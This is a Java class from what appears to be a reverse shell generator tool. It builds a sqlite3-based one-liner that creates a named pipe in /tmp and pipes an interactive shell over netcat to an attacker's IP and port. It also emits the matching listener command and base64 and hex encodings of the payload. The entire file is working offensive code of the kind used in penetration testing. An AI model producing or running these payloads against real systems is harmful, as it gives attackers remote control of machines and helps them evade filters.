    package com.iteso.ReverseShellGenerator.Reverse.Shells;
    import com.iteso.ReverseShellGenerator.DEncoder;
    import com.iteso.ReverseShellGenerator.Reverse.Reverse;

    public class Sqlite3_nc_mkfifo extends Reverse {

        protected String shellFormat = "";

        public Sqlite3_nc_mkfifo(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f'", this.getShell() ,this.getLocalIP() ,this.getLocalPort());
        }

        @Override
        public String getShellCode(){
            return shellFormat;
        }

        @Override
        public String toString(){
            return "{" + "\"parameters\": " + super.toString() + "," +
                        "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                        "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                        "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                        "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                    "}";
        }
    
}